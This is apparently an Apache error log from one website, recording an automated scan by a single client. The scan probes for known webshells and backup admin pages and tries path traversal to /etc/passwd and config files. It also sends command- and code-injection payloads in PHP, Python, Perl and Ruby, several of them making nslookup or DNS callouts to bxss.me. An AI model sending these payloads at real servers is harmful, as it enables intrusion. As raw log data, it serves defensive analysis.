[Thu Jul 08 00:27:35.457616 2021] [php7:error] [pid 29682] [client 27.147.202.214:12939] script '/var/www/html/wilkescw.com/roster/pi.php' not found or unable to stat
[Thu Jul 08 00:27:35.510863 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/c99shell.php' not found or unable to stat
[Thu Jul 08 00:27:35.826736 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/c99.php' not found or unable to stat
[Thu Jul 08 00:27:35.877844 2021] [php7:error] [pid 29691] [client 27.147.202.214:12944] script '/var/www/html/wilkescw.com/admin/index (another copy).php' not found or unable to stat
[Thu Jul 08 00:27:36.089438 2021] [php7:error] [pid 29682] [client 27.147.202.214:12939] script '/var/www/html/wilkescw.com/roster/php.php' not found or unable to stat
[Thu Jul 08 00:27:36.139162 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/nstview.php' not found or unable to stat
[Thu Jul 08 00:27:36.178843 2021] [php7:error] [pid 29691] [client 27.147.202.214:12944] script '/var/www/html/wilkescw.com/admin/index (copy).php' not found or unable to stat
[Thu Jul 08 00:27:36.406723 2021] [php7:error] [pid 29682] [client 27.147.202.214:12939] script '/var/www/html/wilkescw.com/roster/i.php' not found or unable to stat
[Thu Jul 08 00:27:36.438270 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/nst.php' not found or unable to stat
[Thu Jul 08 00:27:36.480091 2021] [php7:error] [pid 29691] [client 27.147.202.214:12944] script '/var/www/html/wilkescw.com/admin/index - Copy.php' not found or unable to stat
[Thu Jul 08 00:27:36.753986 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/rst.php' not found or unable to stat
[Thu Jul 08 00:27:36.804239 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/index - Copy (2).php' not found or unable to stat
[Thu Jul 08 00:27:36.824151 2021] [core:error] [pid 29869] [client 27.147.202.214:11352] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:27:37.035944 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/r57eng.php' not found or unable to stat
[Thu Jul 08 00:27:37.112932 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/Copy of index.php' not found or unable to stat
[Thu Jul 08 00:27:37.347834 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/shell.php' not found or unable to stat
[Thu Jul 08 00:27:37.437011 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/Copy of Copy of index.php' not found or unable to stat
[Thu Jul 08 00:27:37.650409 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/dra.php' not found or unable to stat
[Thu Jul 08 00:27:37.761229 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/Copy (2) of index.php' not found or unable to stat
[Thu Jul 08 00:27:37.810905 2021] [php7:error] [pid 29697] [client 27.147.202.214:12940] script '/var/www/html/wilkescw.com/roster/test.php' not found or unable to stat
[Thu Jul 08 00:27:37.940054 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/r.php' not found or unable to stat
[Thu Jul 08 00:27:38.084324 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/Copy_(1)_of_index.php' not found or unable to stat
[Thu Jul 08 00:27:38.123659 2021] [php7:error] [pid 29697] [client 27.147.202.214:12940] script '/var/www/html/wilkescw.com/roster/temp.php' not found or unable to stat
[Thu Jul 08 00:27:38.216020 2021] [core:error] [pid 29428] [client 27.147.202.214:12943] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:27:38.249222 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/roster/lol.php' not found or unable to stat
[Thu Jul 08 00:27:38.428737 2021] [php7:error] [pid 29697] [client 27.147.202.214:12940] script '/var/www/html/wilkescw.com/roster/info.php' not found or unable to stat
[Thu Jul 08 00:27:38.566148 2021] [php7:error] [pid 29362] [client 27.147.202.214:2929] script '/var/www/html/wilkescw.com/roster/zehir.php' not found or unable to stat
[Thu Jul 08 00:27:38.875157 2021] [php7:error] [pid 29716] [client 27.147.202.214:11350] script '/var/www/html/wilkescw.com/roster/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:27:39.168084 2021] [php7:error] [pid 29716] [client 27.147.202.214:11350] script '/var/www/html/wilkescw.com/roster/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:27:39.441573 2021] [core:error] [pid 29846] [client 27.147.202.214:11354] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:27:39.465535 2021] [php7:error] [pid 29716] [client 27.147.202.214:11350] script '/var/www/html/wilkescw.com/roster/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:27:40.257091 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/index1.php' not found or unable to stat
[Thu Jul 08 00:27:40.551440 2021] [php7:error] [pid 29831] [client 27.147.202.214:12938] script '/var/www/html/wilkescw.com/admin/index2.php' not found or unable to stat
[Thu Jul 08 00:27:40.559332 2021] [core:error] [pid 29507] [client 27.147.202.214:11348] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:27:42.139541 2021] [php7:error] [pid 29697] [client 27.147.202.214:12940] script '/var/www/html/wilkescw.com/admin/index (3rd copy).php' not found or unable to stat
[Thu Jul 08 00:27:42.414424 2021] [php7:error] [pid 29697] [client 27.147.202.214:12940] script '/var/www/html/wilkescw.com/admin/index (third copy).php' not found or unable to stat
[Thu Jul 08 00:27:42.709151 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/index (4th copy).php' not found or unable to stat
[Thu Jul 08 00:27:42.986414 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/index - Copy - Copy.php' not found or unable to stat
[Thu Jul 08 00:27:44.845504 2021] [access_compat:error] [pid 29695] [client 27.147.202.214:12942] AH01797: client denied by server configuration: /var/www/html/wilkescw.com/roster/config/secrets.yml
[Thu Jul 08 00:27:45.152027 2021] [access_compat:error] [pid 29695] [client 27.147.202.214:12942] AH01797: client denied by server configuration: /var/www/html/wilkescw.com/roster/config/initializers
[Thu Jul 08 00:27:45.299749 2021] [core:error] [pid 29886] [client 27.147.202.214:12959] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml? HTTP/1.1
[Thu Jul 08 00:27:45.932083 2021] [core:error] [pid 29647] [client 27.147.202.214:3148] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:27:49.138496 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/old_index.php' not found or unable to stat
[Thu Jul 08 00:27:49.451075 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/index_old.php' not found or unable to stat
[Thu Jul 08 00:27:49.741283 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/bak_index.php' not found or unable to stat
[Thu Jul 08 00:27:50.051925 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/index_bak.php' not found or unable to stat
[Thu Jul 08 00:27:50.366830 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/backup_index.php' not found or unable to stat
[Thu Jul 08 00:27:50.420733 2021] [core:error] [pid 29682] [client 27.147.202.214:12939] AH00126: Invalid URI in request GET /icons/../../Gemfile HTTP/1.1
[Thu Jul 08 00:27:50.680494 2021] [php7:error] [pid 29781] [client 27.147.202.214:12945] script '/var/www/html/wilkescw.com/admin/index_backup.php' not found or unable to stat
[Thu Jul 08 00:27:50.725646 2021] [core:error] [pid 29996] [client 27.147.202.214:13449] AH00126: Invalid URI in request GET /icons/../../web.config HTTP/1.1
[Thu Jul 08 00:27:50.884736 2021] [authz_core:error] [pid 29695] [client 27.147.202.214:12942] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/.htaccess~
[Thu Jul 08 00:27:51.022876 2021] [core:error] [pid 29688] [client 27.147.202.214:4224] AH00126: Invalid URI in request GET /icons/../../package.json HTTP/1.1
[Thu Jul 08 00:27:51.189922 2021] [authz_core:error] [pid 29695] [client 27.147.202.214:12942] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/.htaccess.old
[Thu Jul 08 00:27:51.506403 2021] [authz_core:error] [pid 29695] [client 27.147.202.214:12942] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/.htaccess.save
[Thu Jul 08 00:27:51.952017 2021] [core:error] [pid 29860] [client 27.147.202.214:11357] AH00126: Invalid URI in request GET /icons/../../package-lock.json HTTP/1.1
[Thu Jul 08 00:27:56.428097 2021] [core:error] [pid 29863] [client 27.147.202.214:11354] AH00126: Invalid URI in request GET /icons/../../../Gemfile HTTP/1.1
[Thu Jul 08 00:27:56.750396 2021] [core:error] [pid 29965] [client 27.147.202.214:3101] AH00126: Invalid URI in request GET /icons/../../../web.config HTTP/1.1
[Thu Jul 08 00:27:57.077407 2021] [core:error] [pid 29647] [client 27.147.202.214:11436] AH00126: Invalid URI in request GET /icons/../../../package.json HTTP/1.1
[Thu Jul 08 00:27:57.379558 2021] [core:error] [pid 29725] [client 27.147.202.214:13482] AH00126: Invalid URI in request GET /icons/../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:27:59.562795 2021] [core:error] [pid 29527] [client 27.147.202.214:11355] AH00126: Invalid URI in request GET /icons/../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:28:00.901315 2021] [core:error] [pid 29991] [client 27.147.202.214:12239] AH00126: Invalid URI in request GET /icons/../../../../web.config HTTP/1.1
[Thu Jul 08 00:28:01.216040 2021] [core:error] [pid 29844] [client 27.147.202.214:11271] AH00126: Invalid URI in request GET /icons/../../../../package.json HTTP/1.1
[Thu Jul 08 00:28:01.557076 2021] [core:error] [pid 29971] [client 27.147.202.214:3100] AH00126: Invalid URI in request GET /icons/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:28:03.753892 2021] [core:error] [pid 29697] [client 27.147.202.214:12940] AH00126: Invalid URI in request GET /icons/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:28:04.059297 2021] [core:error] [pid 30017] [client 27.147.202.214:12092] AH00126: Invalid URI in request GET /icons/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:28:07.623428 2021] [core:error] [pid 29860] [client 27.147.202.214:11829] AH00126: Invalid URI in request GET /icons/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:28:08.565339 2021] [core:error] [pid 29974] [client 27.147.202.214:11686] AH00126: Invalid URI in request GET /icons/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:28:27.672007 2021] [php7:error] [pid 30202] [client 27.147.202.214:4206] script '/var/www/html/wilkescw.com/roster/img/9b73crvlkejf.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:28:43.815462 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/apc.php' not found or unable to stat
[Thu Jul 08 00:28:45.960313 2021] [authz_core:error] [pid 30202] [client 27.147.202.214:4206] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/.htaccess
[Thu Jul 08 00:28:46.669915 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/phpinfo.php' not found or unable to stat
[Thu Jul 08 00:28:47.321991 2021] [php7:error] [pid 30196] [client 27.147.202.214:4207] script '/var/www/html/wilkescw.com/roster/img/pi.php' not found or unable to stat
[Thu Jul 08 00:28:47.653209 2021] [php7:error] [pid 29854] [client 27.147.202.214:14352] script '/var/www/html/wilkescw.com/roster/img/r57shell.php' not found or unable to stat
[Thu Jul 08 00:28:48.624230 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/r57.php' not found or unable to stat
[Thu Jul 08 00:28:48.943768 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/r58.php' not found or unable to stat
[Thu Jul 08 00:28:49.079212 2021] [php7:error] [pid 30196] [client 27.147.202.214:4207] script '/var/www/html/wilkescw.com/roster/img/php.php' not found or unable to stat
[Thu Jul 08 00:28:49.262161 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/c99shell.php' not found or unable to stat
[Thu Jul 08 00:28:49.332272 2021] [php7:error] [pid 30202] [client 27.147.202.214:4206] script '/var/www/html/wilkescw.com/roster/img/webadmin.php' not found or unable to stat
[Thu Jul 08 00:28:49.404630 2021] [php7:error] [pid 30196] [client 27.147.202.214:4207] script '/var/www/html/wilkescw.com/roster/img/i.php' not found or unable to stat
[Thu Jul 08 00:28:49.575981 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/c99.php' not found or unable to stat
[Thu Jul 08 00:28:49.729120 2021] [php7:error] [pid 30196] [client 27.147.202.214:4207] script '/var/www/html/wilkescw.com/roster/img/test.php' not found or unable to stat
[Thu Jul 08 00:28:49.897566 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/nstview.php' not found or unable to stat
[Thu Jul 08 00:28:50.051822 2021] [php7:error] [pid 30196] [client 27.147.202.214:4207] script '/var/www/html/wilkescw.com/roster/img/temp.php' not found or unable to stat
[Thu Jul 08 00:28:50.216173 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/nst.php' not found or unable to stat
[Thu Jul 08 00:28:50.381255 2021] [php7:error] [pid 30196] [client 27.147.202.214:4207] script '/var/www/html/wilkescw.com/roster/img/info.php' not found or unable to stat
[Thu Jul 08 00:28:50.539008 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/rst.php' not found or unable to stat
[Thu Jul 08 00:28:50.852055 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/r57eng.php' not found or unable to stat
[Thu Jul 08 00:28:51.166669 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/shell.php' not found or unable to stat
[Thu Jul 08 00:28:51.481332 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/dra.php' not found or unable to stat
[Thu Jul 08 00:28:51.784405 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/r.php' not found or unable to stat
[Thu Jul 08 00:28:52.106135 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/lol.php' not found or unable to stat
[Thu Jul 08 00:28:52.411275 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/roster/img/zehir.php' not found or unable to stat
[Thu Jul 08 00:28:52.730662 2021] [php7:error] [pid 30022] [client 27.147.202.214:4202] script '/var/www/html/wilkescw.com/roster/img/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:28:53.054765 2021] [php7:error] [pid 30022] [client 27.147.202.214:4202] script '/var/www/html/wilkescw.com/roster/img/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:28:53.376107 2021] [php7:error] [pid 30022] [client 27.147.202.214:4202] script '/var/www/html/wilkescw.com/roster/img/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:29:07.232890 2021] [authz_core:error] [pid 29990] [client 27.147.202.214:4205] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/.htaccess~
[Thu Jul 08 00:29:07.558376 2021] [authz_core:error] [pid 29990] [client 27.147.202.214:4205] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/.htaccess.old
[Thu Jul 08 00:29:07.962672 2021] [authz_core:error] [pid 29990] [client 27.147.202.214:4205] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/img/.htaccess.save
[Thu Jul 08 00:29:42.449012 2021] [php7:error] [pid 30020] [client 27.147.202.214:4184] script '/var/www/html/wilkescw.com/admin/MddoiR8h.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:42.862745 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/admin/response.write(9307525*9430854).php' not found or unable to stat
[Thu Jul 08 00:29:42.927928 2021] [authz_core:error] [pid 30413] [client 27.147.202.214:6368] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/admin/.php, referer: https://wilkescw.com/
[Thu Jul 08 00:29:43.181213 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/admin/'+response.write(9307525*9430854)+'.php' not found or unable to stat
[Thu Jul 08 00:29:43.416090 2021] [php7:error] [pid 29691] [client 27.147.202.214:4199] script '/var/www/html/wilkescw.com/admin/index&n993120=v953384.php' not found or unable to stat
[Thu Jul 08 00:29:43.498643 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/admin/"+response.write(9307525*9430854)+".php' not found or unable to stat
[Thu Jul 08 00:29:44.025532 2021] [php7:error] [pid 29860] [client 27.147.202.214:4197] script '/var/www/html/wilkescw.com/admin/).php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:44.352485 2021] [php7:error] [pid 29860] [client 27.147.202.214:4197] script '/var/www/html/wilkescw.com/admin/!(()&&!|*|*|.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:44.668480 2021] [php7:error] [pid 29860] [client 27.147.202.214:4197] script '/var/www/html/wilkescw.com/admin/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:44.671031 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/admin/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Thu Jul 08 00:29:44.797235 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/admin/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitlgtleguunh38e0e.'+'bxss.me').php' not found or unable to stat
[Thu Jul 08 00:29:44.983048 2021] [php7:error] [pid 29860] [client 27.147.202.214:4197] script '/var/www/html/wilkescw.com/admin/';print(md5(31337));$a='.php' not found or unable to stat
[Thu Jul 08 00:29:45.131141 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/admin/'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitlgtleguunh38e0e."+"bxss.me")+'.php' not found or unable to stat
[Thu Jul 08 00:29:45.300473 2021] [php7:error] [pid 29860] [client 27.147.202.214:4197] script '/var/www/html/wilkescw.com/admin/";print(md5(31337));$a=".php' not found or unable to stat
[Thu Jul 08 00:29:45.463072 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/admin/"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitlgtleguunh38e0e.'+'bxss.me')+".php' not found or unable to stat
[Thu Jul 08 00:29:45.688947 2021] [php7:error] [pid 30218] [client 27.147.202.214:7316] script '/var/www/html/wilkescw.com/admin/'.gethostbyname(lc('hittz'.'aelgqnxjd018c.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(113).chr(71).chr(99).chr(76).'.php' not found or unable to stat
[Thu Jul 08 00:29:46.122031 2021] [php7:error] [pid 30000] [client 27.147.202.214:4200] script '/var/www/html/wilkescw.com/admin/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).php' not found or unable to stat
[Thu Jul 08 00:29:46.153693 2021] [php7:error] [pid 29860] [client 27.147.202.214:4197] script '/var/www/html/wilkescw.com/admin/bxss.me.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:46.320576 2021] [php7:error] [pid 30035] [client 27.147.202.214:13810] script '/var/www/html/wilkescw.com/admin/".gethostbyname(lc("hitxk"."xgmboxoe02b75.bxss.me."))."A".chr(67).chr(hex("58")).chr(102).chr(82).chr(114).chr(70).".php' not found or unable to stat
[Thu Jul 08 00:29:47.087284 2021] [php7:error] [pid 30000] [client 27.147.202.214:4200] script '/var/www/html/wilkescw.com/admin/'".php' not found or unable to stat
[Thu Jul 08 00:29:47.117607 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/admin/1P2Xi5MLO.php' not found or unable to stat
[Thu Jul 08 00:29:47.412001 2021] [php7:error] [pid 30000] [client 27.147.202.214:4200] script '/var/www/html/wilkescw.com/admin/<!--.php' not found or unable to stat
[Thu Jul 08 00:29:47.523647 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/cache.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:47.532731 2021] [core:error] [pid 29725] (36)File name too long: [client 27.147.202.214:9089] AH00036: access to /;(nslookup hitziwgbymzba492a8.bxss.me||perl -e "gethostbyname('hitziwgbymzba492a8.bxss.me')")|(nslookup hitziwgbymzba492a8.bxss.me||perl -e "gethostbyname('hitziwgbymzba492a8.bxss.me')")&(nslookup hitziwgbymzba492a8.bxss.me||perl -e "gethostbyname('hitziwgbymzba492a8.bxss.me')")/index.php failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitziwgbymzba492a8.bxss.me||perl -e "gethostbyname('hitziwgbymzba492a8.bxss.me')")|(nslookup hitziwgbymzba492a8.bxss.me||perl -e "gethostbyname('hitziwgbymzba492a8.bxss.me')")&(nslookup hitziwgbymzba492a8.bxss.me||perl -e "gethostbyname('hitziwgbymzba492a8.bxss.me')")')
[Thu Jul 08 00:29:47.657713 2021] [php7:error] [pid 29427] [client 27.147.202.214:9981] script '/var/www/html/wilkescw.com/admin/"+"A".concat(70-3).concat(22*4).concat(114).concat(65).concat(120).concat(65)+(require"socket"\nSocket.gethostbyname("hitzm"+"zzlezakd26f4f.bxss.me.")[3].to_s)+".php' not found or unable to stat
[Thu Jul 08 00:29:47.861988 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/response.write(9022806*9018811).php' not found or unable to stat
[Thu Jul 08 00:29:48.012393 2021] [php7:error] [pid 30225] [client 27.147.202.214:9983] script '/var/www/html/wilkescw.com/roster/2kKgdOVI.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:48.157695 2021] [authz_core:error] [pid 30004] [client 27.147.202.214:4182] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/roster/.php, referer: https://wilkescw.com/
[Thu Jul 08 00:29:48.164597 2021] [php7:error] [pid 29427] [client 27.147.202.214:9981] script '/var/www/html/wilkescw.com/admin/echo abefck$()\\ qbxwmy\\nz^xyu||a #' &echo abefck$()\\ qbxwmy\\nz^xyu||a #|" &echo abefck$()\\ qbxwmy\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:29:48.181266 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/'+response.write(9022806*9018811)+'.php' not found or unable to stat
[Thu Jul 08 00:29:48.281056 2021] [php7:error] [pid 29854] [client 27.147.202.214:14352] script '/var/www/html/wilkescw.com/admin/'+'A'.concat(70-3).concat(22*4).concat(102).concat(67).concat(113).concat(80)+(require'socket'\nSocket.gethostbyname('hithg'+'xyeolmtc2d1d1.bxss.me.')[3].to_s)+'.php' not found or unable to stat
[Thu Jul 08 00:29:48.477025 2021] [php7:error] [pid 29427] [client 27.147.202.214:9981] script '/var/www/html/wilkescw.com/admin/&echo trpmfx$()\\ mtjnhy\\nz^xyu||a #' &echo trpmfx$()\\ mtjnhy\\nz^xyu||a #|" &echo trpmfx$()\\ mtjnhy\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:29:48.512962 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/"+response.write(9022806*9018811)+".php' not found or unable to stat
[Thu Jul 08 00:29:48.550724 2021] [php7:error] [pid 30413] [client 27.147.202.214:6368] script '/var/www/html/wilkescw.com/admin/index9719262.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:48.687017 2021] [php7:error] [pid 30225] [client 27.147.202.214:9983] script '/var/www/html/wilkescw.com/roster/cache&n900350=v993532.php' not found or unable to stat
[Thu Jul 08 00:29:48.799544 2021] [php7:error] [pid 29854] [client 27.147.202.214:14352] script '/var/www/html/wilkescw.com/admin/|echo geozow$()\\ jpkxwm\\nz^xyu||a #' |echo geozow$()\\ jpkxwm\\nz^xyu||a #|" |echo geozow$()\\ jpkxwm\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 00:29:49.099992 2021] [php7:error] [pid 29854] [client 27.147.202.214:14352] script '/var/www/html/wilkescw.com/admin/(nslookup hitnsfiqopruo398fd.bxss.me||perl -e "gethostbyname('hitnsfiqopruo398fd.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:29:49.717841 2021] [php7:error] [pid 29427] [client 27.147.202.214:9981] script '/var/www/html/wilkescw.com/admin/$(nslookup hitsuzmvgctmddc256.bxss.me||perl -e "gethostbyname('hitsuzmvgctmddc256.bxss.me')").php' not found or unable to stat
[Thu Jul 08 00:29:49.721848 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/roster/).php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:49.885963 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitjaglrmdexjd72d0.'+'bxss.me').php' not found or unable to stat
[Thu Jul 08 00:29:50.041559 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/roster/!(()&&!|*|*|.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:50.218437 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitjaglrmdexjd72d0."+"bxss.me")+'.php' not found or unable to stat
[Thu Jul 08 00:29:50.362067 2021] [php7:error] [pid 30004] [client 27.147.202.214:4182] script '/var/www/html/wilkescw.com/roster/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:50.384108 2021] [php7:error] [pid 30413] [client 27.147.202.214:6368] script '/var/www/html/wilkescw.com/roster/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Thu Jul 08 00:29:50.545449 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitjaglrmdexjd72d0.'+'bxss.me')+".php' not found or unable to stat
[Thu Jul 08 00:29:50.693492 2021] [php7:error] [pid 30212] [client 27.147.202.214:10021] script '/var/www/html/wilkescw.com/roster/';print(md5(31337));$a='.php' not found or unable to stat
[Thu Jul 08 00:29:50.910495 2021] [php7:error] [pid 30414] [client 27.147.202.214:6365] script '/var/www/html/wilkescw.com/roster/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).php' not found or unable to stat
[Thu Jul 08 00:29:51.013337 2021] [php7:error] [pid 30212] [client 27.147.202.214:10021] script '/var/www/html/wilkescw.com/roster/";print(md5(31337));$a=".php' not found or unable to stat
[Thu Jul 08 00:29:51.074555 2021] [php7:error] [pid 29854] [client 27.147.202.214:14352] script '/var/www/html/wilkescw.com/admin/&(nslookup hitqbqrtpphlv517b0.bxss.me||perl -e "gethostbyname('hitqbqrtpphlv517b0.bxss.me')")&'\\"`0&(nslookup hitqbqrtpphlv517b0.bxss.me||perl -e "gethostbyname('hitqbqrtpphlv517b0.bxss.me')")&`'.php' not found or unable to stat
[Thu Jul 08 00:29:51.192199 2021] [php7:error] [pid 30218] [client 27.147.202.214:7316] script '/var/www/html/wilkescw.com/roster/bxss.me.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:29:51.512228 2021] [php7:error] [pid 29725] [client 27.147.202.214:9089] script '/var/www/html/wilkescw.com/roster/'".php' not found or unable to stat
[Thu Jul 08 00:29:52.168791 2021] [php7:error] [pid 30218] [client 27.147.202.214:7316] script '/var/www/html/wilkescw.com/students.php' not found or unable to stat, referer: https://wilkescw.com/
